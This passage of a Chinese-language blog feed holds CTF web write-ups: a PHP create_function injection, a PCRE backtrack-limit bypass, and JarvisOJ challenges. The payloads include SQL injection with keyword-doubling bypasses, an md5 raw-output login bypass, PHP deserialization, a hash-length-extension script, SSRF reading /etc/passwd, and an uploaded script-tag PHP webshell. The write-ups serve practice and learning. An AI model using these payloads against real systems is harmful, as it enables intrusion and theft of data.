class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">($a,$b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">"2333"</span>;</span><br><span class="line">&#125;</span><br><span class="line">phpinfo();</span><br><span class="line"><span class="comment">/*&#125;</span></span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1qg8qk7saj30xi0fkace.jpg" alt=""><br>虽然create_function()已经移除了 但是还是会继续执行下面的phpinfo()</p><p>接下里进行读取目录<br>将phpinfo替换为print_r(scandir(‘../‘));即可<br><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?action=%5ccreate_function&amp;arg=<span class="keyword">return</span>%20<span class="string">"2333"</span>;&#125;print_r(scandir(%27../%27));<span class="comment">/*</span></span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1qgczt7smj30yb0a9757.jpg" alt=""><br>接下来读取文件内容<br><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=%5ccreate_function&amp;arg=<span class="keyword">return</span>%20<span class="string">"2333"</span>;&#125;print_r(file_get_contents(%27../flag_h0w2execute_arb1trary_c0de%27));<span class="comment">/*</span></span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1qgetyvmjj30xw086jrq.jpg" alt=""><br>得到flag</p><h1 id="easy-pcrewaf"><a href="#easy-pcrewaf" class="headerlink" title="easy - pcrewaf"></a>easy - pcrewaf</h1><p>端口:8088<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, $data);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">empty</span>($_FILES)) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(show_source(<span class="keyword">__FILE__</span>));</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$user_dir = <span class="string">'data/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span></span><br><span class="line"><span class="php">$data = file_get_contents($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (is_php($data)) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"bad request"</span>;</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">    @mkdir($user_dir, <span class="number">0755</span>);</span></span><br><span class="line"><span class="php">    $path = $user_dir . <span class="string">'/'</span> . random_int(<span class="number">0</span>, <span class="number">10</span>) . <span class="string">'.php'</span>;</span></span><br><span class="line"><span class="php">    move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $path);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    header(<span class="string">"Location: $path"</span>, <span class="keyword">true</span>, <span class="number">303</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure></p><p>通过is_php()正则来检查$data的内容:即:<br>&lt;后面不能有问号，&lt;?后面不能有(;?&gt;反引号<br>题目并没有禁止我们上传php文件，但是对文件内容进行了过滤，禁止我们写入php代码。接下来就是绕过正则<br>在php7 中<br>tags都已经被移除 所以无法使用<br>&lt;%= phpinfo();<br>或者</p><p><script language="php">phpinfo();</script><br>接下来要利用 <strong>php正则回溯法</strong><br><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a></p><p>涉及到正则匹配的流程，正则匹配有两种引擎<br><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">DFA:</span> 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入</span><br><span class="line">NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态</span><br></pre></td></tr></table></figure></p><p>php的PCRE库使用的就是NFA的正则引擎，就会涉及到回溯的一个过程。<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1qh5fwi9ij318q0g7762.jpg" alt=""><br>一开始 <code>.*</code>会将后面的全部字符匹配到，然后为了匹配<code>[(`;?&gt;]</code><br>然后就会一个字符一个字符的回溯，直到匹配到最后的; ，才会进行下一个<code>.*</code>的匹配</p><p>PHP为了防止正则表达式的拒绝服务攻击（回溯次数过多），限制了回溯的次数</p><p>在php5.2及之前这个次数为100000，之后一直到如今的7.2都是1000000<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1qhc3t99zj30tz09u3zu.jpg" alt=""><br>那么如果超过100万次会返回失败  即匹配失败<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(<span class="name">preg_match</span>('/&lt;\?.*[(`;?&gt;].*/is', '&lt;?php phpinfo()<span class="comment">;//'.str_repeat('a', 1000000)));</span></span><br><span class="line">bool(<span class="name">false</span>)</span><br></pre></td></tr></table></figure></p><h1 id="phpmagic"><a href="#phpmagic" class="headerlink" title="phpmagic"></a>phpmagic</h1><p>端口:82</p><h1 id="phplimit"><a href="#phplimit" class="headerlink" title="phplimit"></a>phplimit</h1><p>端口:8084<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])) &#123;    </span></span><br><span class="line"><span class="php">    <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">    show_source(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure></p><p>代码会将<code>$_GET[&#39;code&#39;]</code>中满足正则<code>/[^\W]+\((?R)?\)/</code>的部分，替换为空，然后查看是否剩下的部分强等于;<br>如果满足，则执行<br><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>($_GET[<span class="string">'code'</span>])<span class="comment">;</span></span><br></pre></td></tr></table></figure></p><p>否则什么都不做。<br>首先是[^\W]<br>对于\W,其意思等价于[^A-Za-z0-9_]。<br>那么我们知道，我们的input必须以此开头<br>然后是括号匹配</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\( ...... \)</span><br></pre></td></tr></table></figure><p>括号中间为<br>(?R)?<br>意思为重复整个模式<br>简单理解，我们可以输入以下类型</p><p>a(b(c()))<br>但我们不能加参数,否则将无法匹配</p><p>a(c,d)<br>所以正则看完，题目的意思非常明确了：<br>我们只能input函数，但函数中不能使用参数，否则判断句右边经过替换，将不止剩余分号;</p><p>那么有没有办法通过无参数函数，达到RCE的目的呢？答案显然是不可能的，没有参数，怎么传递我们需要执行的指令呢？</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>JarvisOj-Writeup</title>
      <link href="/2019/03/24/JarvisOj-Writeup/"/>
      <url>/2019/03/24/JarvisOj-Writeup/</url>
      
        <content type="html"><![CDATA[<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g22a8pyxgzj30cx0g73zq.jpg" alt=""><br><a href="https://ws1.sinaimg.cn/large/005RaR9Jgy1g22a90m46bj30hs0mlgm8.jpg" target="_blank" rel="noopener">https://ws1.sinaimg.cn/large/005RaR9Jgy1g22a90m46bj30hs0mlgm8.jpg</a></p><h1 id="PORT51"><a href="#PORT51" class="headerlink" title="PORT51"></a>PORT51</h1><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bubaauujj30i704j0so.jpg" alt=""><br>单纯的我输入：<a href="http://web.jarvisoj.com:51" target="_blank" rel="noopener">http://web.jarvisoj.com:51</a><br>发现不是,如果不是目的端口,那就是源端口了<br>源端口就是指本地端口<br>目的端口就是远程端口<br>很多人都在源端口和目的端口这两个概念上犯迷糊，<br>其实他们只是数据的发送方向的问题。<br>比如很多防火墙的规则设置都要求设置源端口和目的端口，<br>其实就是数据包通过防火墙的方向是向内还是向外。<br><strong>源端口就是本机程序用来发送数据的端口，目的端口就是对方主机用哪个端口接收</strong></p><p>利用curl 命令<br>curl –local-port 51 <a href="http://web.jarvisoj.com:32770/" target="_blank" rel="noopener">http://web.jarvisoj.com:32770/</a><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bv3dnzd1j30j308ajtu.jpg" alt=""></p><h1 id="LOCALHOST"><a href="#LOCALHOST" class="headerlink" title="LOCALHOST"></a>LOCALHOST</h1><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bv6laii0j30fd039q2t.jpg" alt=""><br>直接构造X-Forwarded-For:127.0.0.1发包<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bv75a1hij30m207wjup.jpg" alt=""></p><h1 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h1><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bv7wk5a2j30d503f74d.jpg" alt=""><br>在header里有提示<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bvagk7ndj30jn05aabg.jpg" alt=""><br>这是因<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">md5()函数有两个参数，一个是要加密的字符串，另一个是输出格式</span><br><span class="line">![](https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bvgi6fn5j30p109kwet.jpg)</span><br><span class="line">默认为false</span><br><span class="line">![](https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bvnplslfj30sd05it98.jpg)</span><br><span class="line">当加上true时</span><br><span class="line">![](https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bvsj88x1j30rj06zaaq.jpg)</span><br><span class="line">select * from `admin` where password=&apos;&quot;.md5($pass,true).&quot;&apos;</span><br><span class="line">![](https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bvz1j8ymj310c06qwfk.jpg)</span><br><span class="line">拼接之后就变成了</span><br><span class="line">SELECT * FROM admin WHERE pass = &apos;&apos;or&apos;6&lt;trash&gt;&apos;</span><br><span class="line">提交 ffifdyop 即可</span><br><span class="line"></span><br><span class="line"># 神盾局的秘密</span><br><span class="line">查看源码，发现img值被base64 尝试读取showimg.php</span><br><span class="line">![](https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bw339cgfj30ek02v74e.jpg)</span><br><span class="line">view-source:http://web.jarvisoj.com:32768/showimg.php?img=c2hvd2ltZy5waHA=</span><br><span class="line">![](https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bw4ssxmkj30nz055wei.jpg)</span><br><span class="line">这是用来过滤的,再看Index.php</span><br><span class="line">![](https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bw74j261j30gg05jjrd.jpg)</span><br><span class="line">可能涉及到反序列化，接着读取shield.php</span><br><span class="line">![](https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bw98tow9j30lx07aq33.jpg)</span><br><span class="line">构造序列化</span><br></pre></td></tr></table></figure></p><p>&lt;?php<br>    //flag is in pctf.php<br>    class Shield {<br>        public $file;<br>        function __construct($filename = ‘’) {<br>            $this -&gt; file = $filename;<br>        }</p><pre><code>    function readfile() {        if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE          &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\&apos;)==FALSE) {            return @file_get_contents($this-&gt;file);        }    }}$x = new Shield(&apos;pctf.php&apos;);echo serialize($x);</code></pre><p>?&gt;</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">6</span>:<span class="string">"Shield"</span>:<span class="number">1</span>:&#123;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"file"</span>;<span class="attribute">s</span>:<span class="number">8</span>:<span class="string">"pctf.php"</span>;&#125;</span><br><span class="line">!<span class="selector-attr">[]</span>(<span class="attribute">https</span>:<span class="comment">//ws1.sinaimg.cn/large/005RaR9Jgy1g1bwfup2wnj30rk06h3z0.jpg)</span></span><br><span class="line"></span><br><span class="line"># IN A Mess</span><br><span class="line"></span><br><span class="line">![](<span class="attribute">https</span>:<span class="comment">//ws1.sinaimg.cn/large/005RaR9Jgy1g1bwi4jn68j30et044glt.jpg)</span></span><br><span class="line">看到个ID参数，本能的尝试sql注入测试</span><br><span class="line">查看源码</span><br><span class="line">![](<span class="attribute">https</span>:<span class="comment">//ws1.sinaimg.cn/large/005RaR9Jgy1g1bwmsk9v1j30h0032q33.jpg)</span></span><br><span class="line">访问index.phps,是一道代码审计</span><br><span class="line">![](<span class="attribute">https</span>:<span class="comment">//ws1.sinaimg.cn/large/005RaR9Jgy1g1bwnf2m4jj30t70d3t99.jpg)</span></span><br><span class="line"></span><br><span class="line">id：id==<span class="number">0</span>典型的PHP弱比较，利用id=<span class="number">0</span>a或id=<span class="number">0</span>e123或id=asd均可实现绕过</span><br><span class="line"></span><br><span class="line">b：strlen($b)&gt;<span class="number">5</span> and eregi(<span class="string">"111"</span>.substr($b,<span class="number">0</span>,<span class="number">1</span>),<span class="string">"1114"</span>) and substr($b,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>) 这里要求：b的长度大于<span class="number">5</span>，且是基于eregi函数的弱类型，用%<span class="number">00</span>的绕过（ strlen函数对%<span class="number">00</span>不截断但substr截断）那么可以令b=%<span class="number">00411111</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">data</span>: 用<span class="attribute">php</span>:<span class="comment">//input,data 协议</span></span><br><span class="line">?id=<span class="number">0</span>e&amp;a=<span class="attribute">data</span>:,<span class="number">1112%</span><span class="number">20</span>is%<span class="number">20</span>a%<span class="number">20</span>nice%<span class="number">20</span>lab!&amp;b=%<span class="number">00411111</span></span><br><span class="line">![](<span class="attribute">https</span>:<span class="comment">//ws1.sinaimg.cn/large/005RaR9Jgy1g1bxndjerhj30cn03vq2q.jpg)</span></span><br><span class="line">发现不是flag 于是访问一下</span><br><span class="line">![](<span class="attribute">https</span>:<span class="comment">//ws1.sinaimg.cn/large/005RaR9Jgy1g1bxqnf23ij30c5023t8h.jpg)</span></span><br><span class="line">进行sql注入测试  </span><br><span class="line">发现过滤空格</span><br><span class="line">![](<span class="attribute">https</span>:<span class="comment">//ws1.sinaimg.cn/large/005RaR9Jgy1g1bxrl2a57j305n0150np.jpg)</span></span><br><span class="line">用<span class="built_in">``</span><span class="built_in">` /*1*/ `</span><span class="built_in">``</span>进行绕过</span><br><span class="line">![](<span class="attribute">https</span>:<span class="comment">//ws1.sinaimg.cn/large/005RaR9Jgy1g1bxtnvrsuj30c3021we9.jpg)</span></span><br><span class="line">猜解字段</span><br></pre></td></tr></table></figure><p>id=1/<em>1</em>/order/<em>1</em>/by/<em>1</em>/3<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发现<span class="class"><span class="keyword">union</span> <span class="title">select</span> 等关键词也被<span class="title">waf</span>，用双写进行绕过</span></span><br></pre></td></tr></table></figure></p><p>/index.php?id=-1/<em>1</em>/ununionion/<em>1</em>/sselectelect/<em>1</em>/1,2,3<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">!<span class="selector-attr">[]</span>(<span class="attribute">https</span>:<span class="comment">//ws1.sinaimg.cn/large/005RaR9Jgy1g1by4543n9j30400100cb.jpg)</span></span><br><span class="line">接下来进行常规注入</span><br></pre></td></tr></table></figure></p><p>id=-1/<em>1</em>/ununionion/<em>1</em>/selselectect/<em>1</em>/1,2,database()#<br>index.php?id=-1/<em>1</em>/ununionion/<em>1</em>/selselectect/<em>1</em>/1,2,group_concat(id,context,title)/<em>1</em>/frfromom/<em>1</em>/content#<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">![](<span class="symbol">https:</span>/<span class="regexp">/ws1.sinaimg.cn/large</span><span class="regexp">/005RaR9Jgy1g1by6jgs7sj30co01rgle.jpg)</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp"># RE?</span></span><br><span class="line"><span class="regexp">下载下来后文件名为udf.so.XXXXX，用mysql导入一下。具体过程如下。</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">将udf文件放到/usr</span><span class="regexp">/lib/mysql</span><span class="regexp">/plugin/</span>文件夹中：</span><br><span class="line"></span><br><span class="line">/usr/<span class="class"><span class="keyword">lib</span>/<span class="title">mysql</span>/<span class="title">plugin</span><span class="comment"># wget https://dn.jarvisoj.com/challengefiles/udf.so.02f8981200697e5eeb661e64797fc172</span></span></span><br><span class="line"></span><br><span class="line">登陆mysql后，加载help_me函数：</span><br></pre></td></tr></table></figure></p><p>mysql&gt; create function help_me returns string soname ‘udf.so.02f8981200697e5eeb661e64797fc172’;<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">利用<span class="selector-tag">help_me</span>函数：</span><br><span class="line">!<span class="selector-attr">[]</span>(<span class="attribute">https</span>:<span class="comment">//ws1.sinaimg.cn/large/005RaR9Jgy1g1byabzqy7j30ii046dfu.jpg)</span></span><br><span class="line">利用udf再创建一个getflag函数。</span><br></pre></td></tr></table></figure></p><p>mysql&gt; create function getflag returns string soname ‘udf.so.02f8981200697e5eeb661e64797fc172’;<br>Query OK, 0 rows affected (0.05 sec)<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">得到flag：</span><br><span class="line"></span><br><span class="line">![](https:<span class="regexp">//</span>ws1.sinaimg.cn<span class="regexp">/large/</span><span class="number">005</span>RaR9Jgy1g1bybfs4qmj30iy05974b.jpg)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag在管理员手里</span></span><br><span class="line"></span><br><span class="line">![](https:<span class="regexp">//</span>ws1.sinaimg.cn<span class="regexp">/large/</span><span class="number">005</span>RaR9Jgy1g1bye1p1t1j30jn04kq2v.jpg)</span><br><span class="line">在http头发现cookie头的hash 估计是哈希长度拓展攻击</span><br><span class="line">利用安装hash_extender 进行攻击</span><br><span class="line">在linux</span><br></pre></td></tr></table></figure></p><p>git clone <a href="https://github.com/iagox86/hash_extender" target="_blank" rel="noopener">https://github.com/iagox86/hash_extender</a><br>cd hash_extender<br>make<br><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在hash_extender目录下新建<span class="keyword">test</span>.py文件</span><br></pre></td></tr></table></figure></p><h1 id="coding-utf-8"><a href="#coding-utf-8" class="headerlink" title="-- coding:utf-8 --"></a>-<em>- coding:utf-8 -</em>-</h1><p>from urlparse import urlparse<br>from httplib import HTTPConnection<br>from urllib import urlencode<br>import json<br>import time<br>import os<br>import urllib<br>def gao(x, y):</p><pre><code>    #print x    #print yurl = &quot;http://web.jarvisoj.com:32778/index.php&quot;cookie = &quot;role=&quot; + x + &quot;; hsh=&quot; + y    #print cookiebuild_header = {        &apos;Cookie&apos;: cookie,        &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0&apos;,        &apos;Host&apos;: &apos;web.jarvisoj.com:32778&apos;,        &apos;Accept&apos;: &apos;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&apos;,}urlparts = urlparse(url)conn = HTTPConnection(urlparts.hostname, urlparts.port or 80)conn.request(&quot;GET&quot;, urlparts.path, &apos;&apos;, build_header)resp = conn.getresponse()body = resp.read()return body</code></pre><p>for i in xrange(1000):<br>    print i</p><pre><code># secret len = ???find_hash = &quot;./hash_extender -d &apos;;\&quot;tseug\&quot;:5:s&apos; -s 3a4727d57463f122833d9e732f94e4e0 -f md5  -a &apos;;\&quot;nimda\&quot;:5:s&apos; --out-data-format=html -l &quot; + str(i) + &quot; --quiet&quot;#print find_hashcalc_res = os.popen(find_hash).readlines()hash_value = calc_res[0][:32]attack_padding = calc_res[0][32:]attack_padding = urllib.quote(urllib.unquote(attack_padding)[::-1])ret = gao(attack_padding, hash_value)if &quot;Welcome&quot; in ret:    print ret    break</code></pre><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后在该目录输入 ```python test.py</span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dqxtm02cj30mh0dmq3e.jpg" alt=""></p><h1 id="Chopper"><a href="#Chopper" class="headerlink" title="Chopper"></a>Chopper</h1><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1c024jsz9j30ng0ef41b.jpg" alt=""><br>点击管理员登入<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1c04tqt35j30db045a9z.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1c09w1o4gj30mw07t3yz.jpg" alt=""><br>查看源码<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1c05ppk0jj30n208hgm8.jpg" alt=""><br>发现url参数可控<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1duusczvdj310y0c4myr.jpg" alt=""><br>所以我们可以基本判断，这里是存在SSRF的<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>web.jarvisoj.com:<span class="number">32782</span><span class="regexp">/proxy.php?url=file:/</span><span class="regexp">//</span>etc<span class="regexp">/passwd</span></span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dv352reaj30ck0450sj.jpg" alt=""><br>发现被过滤了<br>进行大写转换<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>web.jarvisoj.com:<span class="number">32782</span><span class="regexp">/proxy.php?url=File:/</span><span class="regexp">//</span>etc<span class="regexp">/passwd</span></span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dv4d2g8sj311y07k404.jpg" alt=""><br>接下来进程站点目录挖掘<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dv6esfunj30pj064t8z.jpg" alt=""><br>当不给url 参数值时 就会报错<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:<span class="regexp">//</span>web.jarvisoj.com:<span class="number">32782</span><span class="regexp">/proxy.php?url=File:/</span><span class="regexp">//</span>opt<span class="regexp">/lampp/</span>htdocs<span class="regexp">/proxy.php</span></span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dv85qcmnj30vr0ip0ub.jpg" alt=""><br>接下来读取admin目录<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>web.jarvisoj.com:<span class="number">32782</span><span class="regexp">/proxy.php?url=File:/</span><span class="regexp">//</span>opt<span class="regexp">/lampp/</span>htdocs<span class="regexp">/admin/i</span>ndex.html</span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dvbfqkbhj30pl08ot96.jpg" alt=""><br>对admin目录进行爆破<br>发现robots.txt<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dvd32k7hj30s305w3yv.jpg" alt=""><br>访问trojan.php,得到flag<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dvg66cr2j310k074aat.jpg" alt=""></p><h1 id="Easy-Gallery"><a href="#Easy-Gallery" class="headerlink" title="Easy Gallery"></a>Easy Gallery</h1><p>打开是这么一个页面<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dta9cg6bj30yl0fygo1.jpg" alt=""></p><p>尝试先上传一个正常的jpg文件,然后在view中查看<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dthupb8tj30qz0i2dtc.jpg" alt=""></p><p>右击复制图片链接地址,得到图片地址<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>web.jarvisoj.com:<span class="number">32785</span><span class="regexp">/uploads/</span><span class="number">1553405018</span>.jpg</span><br></pre></td></tr></table></figure></p><p>上传木马图片,用菜刀连接,连接失败<br>观察这两个链接<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://web.jarvisoj.<span class="keyword">com</span>:<span class="number">32785</span>/<span class="built_in">index</span>.php?page=submit</span><br><span class="line">http://web.jarvisoj.<span class="keyword">com</span>:<span class="number">32785</span>/<span class="built_in">index</span>.php?page=<span class="keyword">view</span></span><br></pre></td></tr></table></figure></p><p>加上单引号试试<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web.jarvisoj.<span class="keyword">com</span>:<span class="number">32785</span>/<span class="built_in">index</span>.php?page=<span class="keyword">view</span><span class="string">'</span></span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dtraxii4j30rt0a33z1.jpg" alt=""><br>可能存在文件包含漏洞,试着包含刚刚的图片<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dtsumgxlj30s108nmxo.jpg" alt=""><br>发现被加上了php后缀,尝试用%00 进行绕过<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dtvb9bnij30oy08zaaf.jpg" alt=""><br>尝试更换另一种script木马试试<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"php"</span>&gt;</span><span class="undefined">phpinfo();</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><img 